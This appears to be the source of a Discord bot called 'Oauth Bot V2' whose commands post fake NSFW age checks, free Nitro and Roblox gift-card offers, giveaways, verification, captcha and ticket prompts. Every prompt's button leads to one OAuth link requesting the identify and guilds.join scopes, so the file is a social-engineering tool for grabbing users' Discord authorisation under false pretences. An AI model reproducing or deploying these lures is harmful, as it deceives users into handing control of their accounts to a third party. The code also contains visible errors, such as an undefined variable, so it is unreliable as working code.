const { Collection, Client, Discord, MessageEmbed, Message, Intents } = require('discord.js');
const moment = require("moment")
require("moment-duration-format")
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });
require('discord-buttons')(client);
const path = require('path')
const fs = require('fs')
let cpuStat = require("cpu-stat");
const discordbuttons = require('discord-buttons')
let os = require("os");
const { MessageButton, MessageActionRow, URL, ButtonBuilder, Link} = require("discord-buttons")
const keepAlive = require("./server");
client.prefix = "+"




    const activities = [
      "...",
      "+help | v2",
    ];

    client.on("ready", () => {
      // run every 10 seconds
      setInterval(() => {
        // generate random number between 1 and list length.
        const randomIndex = Math.floor(Math.random() * (activities.length - 1) + 1);
        const newActivity = activities[randomIndex];

        client.user.setActivity(newActivity);
      }, 20000);
    });




client.on('message', async (message) => {
    if (message.content.startsWith('+help')) {
        const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(`**Oauth Bot V2**`)

        .setDescription (`🍁 ** Commandes:**\n \`help\` \`stats\`\n\n✨ ** Commandes du bot:**\n \`nsfw\` \`nitro\` \`verification\` \`giveaway\` \`boost\` \`captcha\` \`ticket\``)
        message.channel.send({embed: embed })
    }
})




client.on('message', async (message) => {
    if (message.content.startsWith('+stats')) {
      cpuStat.usagePercent(function (e, percent, seconds) {
          if (e) {
              return console.log(String(e.stack).red);
          }
          const duration = moment.duration(client.uptime).format(" D [days], H [hrs], m [mins], s [secs]");

          let connectedchannelsamount = 0;
          let guilds = client.guilds.cache.map((guild) => guild);
          for (let i = 0; i < guilds.length; i++) {
              if (guilds[i].me.voice.channel) connectedchannelsamount += 1;
          }
        const embed = new MessageEmbed()
        .setColor("0")
        .setTitle(`**Stats:**`)

              .addField("⏳ Memory Usage", `\`${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}/ ${(os.totalmem() / 1024 / 1024).toFixed(2)}MB\``, false)
              .addField("⌚️ Uptime ", `\`${duration}\``, false)
              .addField("📁 Users", `\`${client.users.cache.size}\``, false)
              .addField("🚀 Servers", `\`${client.guilds.cache.size}\``, false)
             .addField("⏰ API Latency", `\`${client.ws.ping}ms\``, false)
              .addField("🤖 CPU usage", `\`${percent.toFixed(2)}%\``, false)
              .setFooter("Coded by: Felosi");
        message.channel.send({embed: embed })
    }
   )}
})




//----------------GRAB------------------

client.on('message', async (message) => {
    if (message.content.startsWith('+nsfw')) {
        const embed = new MessageEmbed()
        .setTitle(`NSFW Verification`)
        .setDescription(`Click the emoji to confirm that you are 18 or older and consent to view sexual content.`)
.setImage('https://cdn.discordapp.com/attachments/945812190936584233/1089594308543393792/JqoLqSb_1.gif')
        .setColor("0")

        const z = new MessageButton()
            .setStyle("url")
            .setLabel("🔞")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399")
        const row = new MessageActionRow()
            .addComponent([z])

        message.channel.send({ component: row, embed: embed })
    }
})
  


client.on('message', async (message) => {
    if (message.content.startsWith('+boost')) {
        const embed = new MessageEmbed()
        .setTitle("Hello everyone, you have all received a Nitro Discord for one year!")
        .setDescription(`To get your Nitro Boost, all you need to do is:
   \n1️⃣ Click on the button [claim](https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399).
   \n2️⃣ Click on the button [autorize](https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399).\n\nOnce you get autorized you need to wait about 24-48 hours and you will get it.`)
.setImage('https://i.ibb.co/54xmJfm/Capture-decran-le-2022-12-30-a-15-58-02.png')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("🎁 Claim")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})


client.on('message', async (message) => {
    if (message.content.startsWith('+giveaway')) {
        const embed = new MessageEmbed()
        .setTitle("**Nitro Boost 1 month 🎁** ")
        .setDescription(`\nWinners: \`1\`\nTimer: \`Ends in 2 hours\`\nHosted by: <@${ctx.author.id}>\n\n\n\n:tada: To enter the giveaway, click on the button below.`)
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("🎉 Enter")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+roblox')) {
        const embed = new MessageEmbed()
        .setTitle("**You won a $10 Roblox gift card click claim button to get!**")
.setImage('https://scratchmonkeys.com/image/cache/catalog/Product%20Images/Roblox/USD/roblox-gift-card-10-300x190.webp')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Claim")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+verification')) {
        const embed = new MessageEmbed()
        .setTitle("Verification")
        .setDescription(`**Please click on the button to access the server!**`)
.setImage('https://themaestro.in/wp-content/uploads/2018/11/recaptcha.gif')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("✅")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+captcha')) {
        const embed = new MessageEmbed()
        .setTitle("**ℹ️ Welcome to [+] Protect!**")
        .setDescription(`In order to access the entire server, please click on the button and answer what you read in the image below (to verify that you are not a robot).`)
.setFooter("⚠️ The code consists of 5 letters/numbers.")
.setImage('https://www.learningsuccessblog.com/files/0aainput-black.gif')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Respond")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+ticket')) {
        const embed = new MessageEmbed()
        .setTitle("Support")
        .setDescription(`To create a ticket react with 📩`)
.setFooter("[+] Protect - Ticketing without clutter")
.setImage('https://pbs.twimg.com/profile_images/1108487086598950912/5-gzDvuA_400x400.png')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("📩 Create ticket")
            .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1093018998414778399")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

keepAlive();
client.login(process.env.TOKEN);
